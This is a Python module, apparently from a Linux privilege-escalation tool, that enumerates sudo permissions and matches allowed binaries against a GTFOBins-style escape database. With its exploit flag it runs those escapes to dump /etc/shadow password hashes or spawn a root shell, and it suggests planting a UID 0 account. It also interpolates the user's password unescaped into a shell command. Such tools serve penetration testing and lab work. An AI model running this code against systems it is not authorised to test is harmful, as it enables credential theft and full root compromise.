#!/usr/bin/python3

from subprocess import run, PIPE
import time
from Scripts.settings import *
from Scripts.gtfobins_database import database_dict

progress = Progress()

def create_vulnerable_bin_list(result, whoami, silence):
    possible_vulnerable_sudo_bin = []
    result = result.splitlines()[2::]
    for line in result:
        if line:
            if whoami in line:
                line = line.replace(whoami, RED + whoami + LIGHTGRAY)
            if not silence:
                output(LIGHTGRAY + line + END)

            # check if there is a possible vulnerable binary that can be executed as sudo and add to a list
            bin_directory = line.strip().split()[-1]
            bin_name = bin_directory.split("/")[-1]
            if bin_name in database_dict.keys():
                possible_vulnerable_sudo_bin.append(bin_directory)

    return possible_vulnerable_sudo_bin


def unpack_commands(commands):
    output(LIGHTGRAY + ITALIC)
    for cmd in commands:
        output(cmd)
    output(END)


def result_find_sudo(whoami, grep_users, silence, exploit, user_password):
    vuln_bins_table = []
    # get sudoers output if have access (not good, only root has access)
    sudoers_cmd = "grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -vE \"#|Defaults\" 2>/dev/null"
    sudoers_output = run(sudoers_cmd, shell=True, stdout=PIPE).stdout.decode()
    if sudoers_output:
        if not silence:
            output(f"{BG_Red}[+] Can read sudoers file for vital information:{END}")
        output(f"<p>User can read sudoers file for vital information:</p>", True)
        output("<ul>", True)
        for line in sudoers_output.splitlines():
            html_line = ""
            for user in grep_users:
                if user in line:
                    line = line.replace(user, RED + user + LIGHTGRAY)
                    html_line = html_line.replace(user, f"<span class='warning'>{user}</span>")
                    break
            if not silence:
                output(LIGHTGRAY + line + END)
            output(html_line, True)
            output()
        output("</ul>", True)

    # sudo -l with no password provided
    sudo_no_pass = "echo '' | sudo -S -l -k 2>/dev/null"
    sudoers_output_no_pass = run(sudo_no_pass, shell=True, stdout=PIPE).stdout.decode()
    if sudoers_output_no_pass:
        if not silence:
            output(f"{YELLOW}[+] Can use sudo without a password:")
        output(f"<p>User can use sudo without a password for the following binaries!</p>", True)
        possible_vulnerable_sudo_bin = create_vulnerable_bin_list(sudoers_output_no_pass, whoami, silence)

    # tries sudo with provided password
    elif user_password:
        sudo_with_pass = f"echo '{user_password}' | sudo -S -l -k 2>/dev/null"
        sudoers_output_with_pass = run(sudo_with_pass, shell=True, stdout=PIPE).stdout.decode()
        if not silence:
            output(f"{YELLOW}[+] Can use sudo with a password:")
        output(f"<p>User can use sudo with a password for the following binaries!</p>", True)
        possible_vulnerable_sudo_bin = create_vulnerable_bin_list(sudoers_output_with_pass, whoami, silence)

    else:
        if not silence:
            output(f"{YELLOW}The current user does not have sudo privileges.{END}")
        progress.running = False
        return

    if not silence:
        output()

    progress.running = False

    if len(possible_vulnerable_sudo_bin) > 0:
        for bin_directory in possible_vulnerable_sudo_bin:
            bin_name = bin_directory.split("/")[-1]
            command_list = database_dict[bin_name][0]
            if len(command_list) > 0:
                if any("file_to_read" in cmd for cmd in command_list):

                    if not silence:
                        output(end="\r")
                        output(f"{BG_Red}SUDO BINARY FOUND: {bin_name.upper() + END}\n"
                               f"This binary can be used to read files using superuser permission. e.g. /etc/shadow.\n")

                    vuln_bins_table.append((bin_directory, "<br>".join(command_list),
                                            "This binary can be used to read files using superuser permission. e.g. /etc/shadow."))

                    if exploit and not silence:
                        output(f"Trying to read {ITALIC}\"shadow\"{END} file...")
                        for cmd in command_list:
                            if "file_to_read" not in cmd:
                                possible_hashes = ""
                                if bin_name not in ["aspell", "xmore", "whiptail"]:
                                    possible_hashes = run(
                                        f"{cmd.replace('$LFILE', '/etc/shadow')} 2>&1 | {grep_users} "
                                        f"| cut -d ':' -f 1,2 | sed -E 's,:.*,{RED}&{END},'", shell=True,
                                        stdout=PIPE).stdout.decode()
                                if possible_hashes:
                                    if not silence:
                                        output(f"{YELLOW}Possible hashes found:{END}")
                                        output(possible_hashes)

                                        output(
                                            f"{GREEN}If you see part of hashes, or error message above it could mean that the command works but the output is messy.\n"
                                            f"You may want to try to execute the command bellow to make sure.")
                                        output()
                                        unpack_commands(command_list)

                                else:
                                    if not silence:
                                        output(f"{GREEN}Couldn't read shadow file from here.\n"
                                               f"This binary might be using another editor to read the file, or the output is messy.\n"
                                               f"You may try reading it using the following command: \n")
                                        unpack_commands(command_list)
                                        output()
                                    break
                    else:
                        if not silence:
                            output(f"You may try reading it using the following command: \n")
                            unpack_commands(command_list)
                            output()

                elif any(any(x in cmd for x in ["file_to_write", "file_to_send", "file_to_save"]) for cmd in
                         command_list):

                    vuln_bins_table.append((bin_directory, "<br>".join(command_list),
                                            "This binary can be used to overwrite other files using superuser permission."))

                    if not silence:
                        output(f"{BG_Red}SUDO BINARY FOUND: {bin_name.upper() + END}\n"
                               f"This binary can be used to overwrite other files using superuser permission.\n\n"
                               f"{GREEN}For example you might want to use this to exploit the possibility of adding a new user with "
                               f"the UID 0 to {END}{ITALIC + LIGHTGRAY}\"passwd\" {END}{GREEN}or{END}{ITALIC + LIGHTGRAY} \"shadow\"{END}{GREEN}"
                               f" files and then escalate your privileges to that user.\n")
                    if exploit and not silence:
                        output(
                            f"This script CANNOT exploit this binary even if the exploit flag is selected as it will overwrite some files. Test this at your own risk!\n\n")
                    if not silence:
                        output(f"{YELLOW}You may try the following commands.\n")
                        unpack_commands(command_list)
                        output()

                elif any("file_to_change" in cmd for cmd in command_list):

                    vuln_bins_table.append((bin_directory, "<br>".join(command_list),
                                            "This binary can be used to change other files using superuser permission."))
                    if not silence:
                        output(end="\r")
                        output(f"{BG_Red}SUDO BINARY FOUND: {bin_name.upper() + END}\n"
                               f"This binary can be used to change other files using superuser permission.")
                    if exploit and not silence:
                        output(
                            f"This script CANNOT exploit this binary even if the exploit flag is selected as it will overwrite some files. Test this at your own risk!\n\n")

                    if not silence:
                        output(f"{YELLOW}You may try the following commands.\n")
                        unpack_commands(command_list)
                        output()

                else:
                    vuln_bins_table.append((bin_directory, "<br>".join(command_list),
                                            "This binary can be used to invoke a root shell directly from the current user shell."))

                    if not silence:
                        output(end="\r")
                        output(f"{BG_Red}BINARY FOUND: {bin_name.upper() + END}\n"
                               f"With this binary you may invoke a root shell directly.\n"
                               f"You may try to invoke a ROOT SHELL using the following command(s).{RED}\n")
                        unpack_commands(command_list)

                    if exploit and (
                            len(command_list) > 1 or bin_name in ["tar", "vi", "view", "vim", "vimdiff", "watch",
                                                                  "service", "rvim", "rview", "rpmdb", "rpmverify",
                                                                  "perlbug", "except", "rake",
                                                                  "rsync"]) and not silence:
                        output(f"{YELLOW}This script CANNOT invoke a shell using this binary.{END}\n")

                    elif exploit and not silence:
                        output(f"Trying to invoke a root shell and read the {ITALIC}\"shadow\"{END} file.\n")

                        if "/bin/sh" in command_list[0]:
                            invoke_shell = command_list[0].replace("/bin/sh", r"/bin/sh -c \"cat /etc/shadow\"")
                        else:
                            invoke_shell = command_list[0] + ' -c "cat /etc/shadow"'
                        result = run(
                            f"{invoke_shell.strip()} | {grep_users} | cut -d ':' -f 1,2 | sed -E 's,:.*,{RED}&{END},'",
                            shell=True, stdout=PIPE).stdout.decode()
                        if result:
                            output(f"{YELLOW}Possible hashes found:{END}\n"
                                   f"{result}\n"
                                   f"{YELLOW}Note: If you don't see any hashes above, the script may have failed to invoke a shell.")

                        output()

    else:
        if not silence:
            output(f"No vulnerable binaries found in the system.\n"
                   "You may try to run the following command and double check.\n\n"
                   f"{LIGHTGRAY}sudo -l{END}\n")

    return vuln_bins_table


def find_sudo(whoami, grep_users, silence, exploit, user_password):
    progress_thread = CThread(target=lambda: progress.progress_func(silence))
    result_findings_thread = CThread(target=lambda: result_find_sudo(whoami, grep_users, silence, exploit, user_password))

    progress_thread.start()
    result_findings_thread.start()

    progress_thread.join()
    return result_findings_thread.join()
